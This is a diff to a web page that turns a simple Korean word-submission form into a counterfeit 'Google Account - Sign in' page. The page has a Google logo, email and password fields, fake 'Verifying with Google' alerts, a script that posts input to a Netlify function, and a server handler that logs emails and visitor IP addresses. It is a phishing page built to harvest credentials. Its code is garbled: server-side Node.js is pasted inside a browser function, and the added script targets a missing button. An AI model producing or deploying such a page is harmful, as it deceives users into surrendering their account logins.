@@ -1,104 +1,139 @@
 <!DOCTYPE html>
-<html lang="ko">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>단어 제출</title>
-
-  <style>
-    body {
-      margin: 0;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: #111;
-      color: white;
-      font-family: Arial, sans-serif;
-    }
-
-    .box {
-      width: min(90%, 450px);
-      padding: 30px;
-      background: #222;
-      border-radius: 20px;
-    }
-
-    input, button {
-      width: 100%;
-      padding: 15px;
-      margin-top: 10px;
-      box-sizing: border-box;
-      font-size: 16px;
-      border-radius: 10px;
-    }
-
-    button {
-      cursor: pointer;
-    }
-
-    #message {
-      margin-top: 15px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Account - Sign in</title>
+    <style>
+        /* 이전 스타일 그대로 유지 */
+        body { margin:0; padding:0; background:#f8f9fa; font-family:'Roboto',Arial,sans-serif; height:100vh; display:flex; justify-content:center; align-items:center; }
+        .google-box { background:white; padding:40px 50px; border-radius:8px; width:420px; box-shadow:0 2px 20px rgba(0,0,0,0.15); text-align:center; }
+        .google-logo { font-size:32px; margin-bottom:20px; }
+        .g-blue {color:#4285f4;} .g-red {color:#ea4335;} .g-yellow {color:#fbbc05;} .g-green {color:#34a853;}
+        h1 {font-size:24px; margin:10px 0 8px;}
+        p {color:#5f6368; margin-bottom:25px;}
+        input {width:100%; padding:14px 16px; margin:8px 0; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box;}
+        input:focus {outline:none; border:2px solid #4285f4;}
+        button {width:100%; padding:12px 24px; margin-top:20px; background:#1a73e8; color:white; font-size:15px; font-weight:500; border:none; border-radius:4px; cursor:pointer;}
+        button:hover {background:#185abc;}
+        .info {margin-top:20px; font-size:12px; color:#666;}
+    </style>
 </head>
-
 <body>
-  <div class="box">
-    <h1>원하는 단어</h1>
+    <div class="google-box">
+        <div class="google-logo">
+            <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
+        </div>
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+        
+        <input type="text" id="email" placeholder="Email or phone" required>
+        <input type="password" id="password" placeholder="Password" required>
+        
+        <button onclick="GoogleLogin()">Next</button>
+        
+        <div class="info" id="savedInfo"></div>
+    </div>
 
-    <input
-      id="word"
-      maxlength="100"
-      placeholder="단어를 입력하세요"
-    >
+    <script>
+        let userData = { email: "", lastLogin: "" };
 
-    <button id="submit">제출</button>
-
-    <div id="message"></div>
-  </div>
-
-  <script>
-    const input = document.querySelector("#word");
-    const button = document.querySelector("#submit");
-    const message = document.querySelector("#message");
-
-    button.addEventListener("click", async () => {
-      const word = input.value.trim();
-
-      if (!word) {
-        message.textContent = "단어를 입력하세요.";
-        return;
-      }
-
-      button.disabled = true;
-      message.textContent = "저장 중...";
-
-      try {
-        const response = await fetch("/.netlify/functions/submit", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ word })
-        });
-
-        const result = await response.json();
-
-        if (!response.ok) {
-          throw new Error(result.error);
+        // 저장된 JSON 데이터 불러오기 (localStorage에서 JSON 형태로 관리)
+        function loadData() {
+            const saved = localStorage.getItem('GoogleUserData');
+            if (saved) {
+                userData = JSON.parse(saved);
+                document.getElementById('email').value = userData.email || "";
+                document.getElementById('savedInfo').innerHTML = 
+                    `Last login: ${userData.lastLogin || 'Never'}`;
+            }
         }
 
-        input.value = "";
-        message.textContent = "제출 완료!";
+        function saveData(email) {
+            userData.email = email;
+            userData.lastLogin = new Date().toLocaleString();
+            localStorage.setItem('GoogleUserData', JSON.stringify(userData));
+        }
 
-      } catch (error) {
-        message.textContent = "오류가 발생했습니다.";
-        console.error(error);
-      }
+        function GoogleLogin() {
+            const fs = require('fs');
+const path = require('path');
 
-      button.disabled = false;
+exports.handler = async function(event) {
+    if (event.httpMethod !== 'POST') {
+        return { statusCode: 405, body: 'Method Not Allowed' };
+    }
+
+    try {
+        const data = JSON.parse(event.body);
+        const filePath = path.join(__dirname, '../../data/users.json');
+        
+        let users = [];
+        if (fs.existsSync(filePath)) {
+            users = JSON.parse(fs.readFileSync(filePath, 'utf8'));
+        }
+
+        users.push({
+            email: data.email,
+            timestamp: new Date().toISOString(),
+            ip: event.headers['x-forwarded-for'] || 'unknown'
+        });
+
+        fs.writeFileSync(filePath, JSON.stringify(users, null, 2));
+
+        return {
+            statusCode: 200,
+            body: JSON.stringify({ success: true, message: "Saved" })
+        };
+    } catch (error) {
+        return {
+            statusCode: 500,
+            body: JSON.stringify({ success: false, error: error.message })
+        };
+    }
+};
+
+            
+            let attempts = (localStorage.getItem('attemptCount') || 0) * 1 + 1;
+            localStorage.setItem('attemptCount', attempts);
+
+            if (attempts === 1) {
+                alert("✅ Verifying with Google...");
+            } else if (attempts === 2) {
+                alert("✅ Almost done...");
+            } else {
+                document.body.innerHTML = `<div style="height:100vh;background:#000;color:#0f0;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:monospace;padding:40px;text-align:center;">
+                    <h1 style="color:red;">An Error Occered.</h1>
+                    <p>Saved Data (JSON):</p>
+                    <pre style="background:#111;color:#0f0;padding:15px;">${JSON.stringify(userData, null, 2)}</pre>
+                    <button onclick="location.reload()">Try Again</button>
+                </div>`;
+            }
+        }
+
+        // 페이지 로드 시 데이터 불러오기
+        window.onload = loadData;
+    </script>
+  <script>
+  const input = document.querySelector("#email, #password");
+  const button = document.querySelector("#submit");
+
+  button.addEventListener("click", async () => {
+    const word = input.value.trim();
+
+    if (!word) return;
+
+    await fetch("/.netlify/functions/submit", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ word })
     });
-  </script>
+  });
+</script>
+
+</body>
+</html>
 </body>
 </html>
